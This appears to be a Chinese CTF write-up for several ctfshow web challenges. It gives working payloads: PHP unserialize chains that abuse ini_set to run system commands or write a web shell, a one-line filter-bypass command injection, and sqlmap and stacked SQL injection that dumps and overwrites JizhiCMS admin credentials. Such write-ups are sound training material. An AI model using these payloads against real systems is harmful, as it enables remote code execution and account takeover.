+++
title = "ctfshow大牛杯"
slug = "ctfshow-big-shot-cup"
description = "刷"
date = "2025-01-17T19:59:59"
lastmod = "2025-01-17T19:59:59"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["php"]
+++

## easy_unserialize

```php
<?php
highlight_file(__FILE__);
class main{
    public $settings;
    public $params;

    public function __construct(){
        $this->settings=array(
        'display_errors'=>'On',
        'allow_url_fopen'=>'On'
        );
        $this->params=array();
    }
    public function __wakeup(){
        foreach ($this->settings as $key => $value) {
            ini_set($key, $value);
        }
    }

    public function __destruct(){
        file_put_contents('settings.inc', unserialize($this->params));
    }
}

unserialize($_GET['data']);
```

可以利用`ini_set`进行在线配置，相当于热加载，参数还是可控的，直接找可利用函数即可，找到`unserialize_callback_func`，这个函数可以执行函数，而函数参数是反序列化的类名，比如

```php
<?php
class main{
    public $settings;
    public $params;

    public function __construct(){
        $this->settings=array(
        'unserialize_callback_func'=>'system',
        );
        $this->params='O:2:"ls":0:{}';      
    }
}
$a=new main();
echo serialize($a);
```

这样子就可以，还有个很好利用的方向就是，只要值是没有定义的方法，就会把这个方法在报错中显示出来，也就是相当于执行命令了，而我们再把错误日志给写出来，进行动态设置，相当于是一个软链接，就可以去访问拿到命令执行的结果了，还要设置`html_errors`不然会把错误进行html编码就不能得到结果了

```php
<?php
class A{
}
class main{
    public $settings;
    public $params;

    public function __construct(){
        $this->settings=array(
            'error_log'=>'shell.php',
            /*'unserialize_callback_func'=>'<?php phpinfo();?>',*/
            'unserialize_callback_func'=>'<?php system("ls /");?>',
            'html_errors'=>false
        );
        $this->params=serialize(new A());
    }
}
$a=new main();
echo serialize($a);
```

还有个函数

> spl_autoload 
> 它可以接收两个参数，第一个参数是$class_name，表示类名，第二个参数$file_extensions是可选的，表示类文件的扩展名,如果不指定的话，它将使用默认的扩展名.inc或.php

```php
<?php
class settings{

}
class main{
    public $settings;
    public $params;

    public function __construct(){
        $this->settings=array(
        'unserialize_callback_func'=>'spl_autoload',
        );
        //$this->params=serialize("<?php system('cat /f*');"); 生成settings.inc文件，内容是<?php system('cat /f*');
        //$this->params=serialize(new settings()); 加载settings.inc
        
    }
}
$a=new main();
echo serialize($a);
```

依次执行即可

## RealWorld_CyberShow

进去之后，先进blog才能拿到第四个页面，给了用户名模板和初始密码，爆破用户名就可以了

```
2020036001\363636
```

## web_checkin

```php
<?php
error_reporting(0);
include "config.php";
//flag in /

function check_letter($code){
    $letter_blacklist = str_split("abcdefghijklmnopqrstuvwxyz1234567890");
    for ($i = 0; $i < count($letter_blacklist); $i+=2){
        if (preg_match("/".$letter_blacklist[$i]."/i", $code)){
            die("xi nei~");
        }
    }
}

function check_character($code){
    $character_blacklist = array('=','\+','%','_','\)','\(','\*','&','\^','-','\$','#','`','@','!','~','\]','\[','}','{','\'','\"',';',' ','\/','\.','\?',',','<',':','>');
    for ($i = 1; $i < count($character_blacklist); $i+=2){
        if (preg_match("/".$character_blacklist[$i]."/", $code)){
            die("tongtong xi nei~");
        }
    }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if (!file_exists($dir)) {
    mkdir($dir);
}
if (isset($_GET["code"])) {
    $code = substr($_GET["code"], 0, 12);
    check_letter($code);
    check_character($code);

    file_put_contents("$dir" . "index.php", "<?php ".$code.$fuxkfile);
    echo $dir;
}else{
    highlight_file(__FILE__);
}
```

看着特别吓人，直接给闭合了就完事了

```
?code=?><?=`nl%09/*`
```

## easy CMS

> 修改点在 **FrPHP/lib/Model.php的第36行**
>
> 注入点在 **Home/c/HomeController.php的jizhi_details**
>
> hint：后台似乎有个压缩包getshell

简单看了一下代码，觉得存在sql注入漏洞，并且开了3306和6379端口的，找找代码，在`index.php`里面看到了查询语句，然后开始干

```php
$sql = str_replace('jz_',$config['db']['prefix'],$sql);
		$count=100;
		$sql = substr($sql,14);
		$sql.="UPDATE `jz_level` SET `name`='".$_POST['admin_name']."',`pass`='".md5(md5($_POST['admin_pass']).'YF')."' , `regtime` = '".time()."' , `logintime` = ".time()."   WHERE id=1";
```

```
python sqlmap.py http://5ae6bfbc-c7a1-4626-8bbc-ec441d22c8c7.challenge.ctf.show/home/jizhi_details/?id=1 -D jizhicms192 -T jz_level -C name,pass --dump --batch
```

得到poc以及用户名和加密的密码

```
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9720 FROM (SELECT(SLEEP(5)))lqJe) AND 'MuKV'='MuKV
---
+--------+----------------------------------+
| name   | pass                             |
+--------+----------------------------------+
| feng   | c88a0b9d42e61f4683c2081481cabb38 |
```

结果这一次注入靶机就没了，再次进行注入，利用联合注入

```
python sqlmap.py -u  http://c6b85b76-eb22-408e-9bb4-dd0b276d2816.challenge.ctf.show/home/jizhi_details/?id=1 --technique S --risk 3 --level 5 --dbs --batch
```

得到了`poc`

```
---
Parameter: id (GET)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1';SELECT SLEEP(5)#
---
```

我们可以直接进行堆叠注入了那，把密码给改了

```
/home/jizhi_details/?id=1';update jz_level set pass='a07b6751d2d9fb3a3a8488a030c69ec6' where name='feng'%23
```

我们的用户名密码就变成了

```
feng\123456
```

登不上？我没问题吧，后面就是一个压缩包getshell，打不了了，后面应该是把一句话压缩成zip放服务器上面，让其远程加载，然后去访问`/A/exts/`下的shell即可
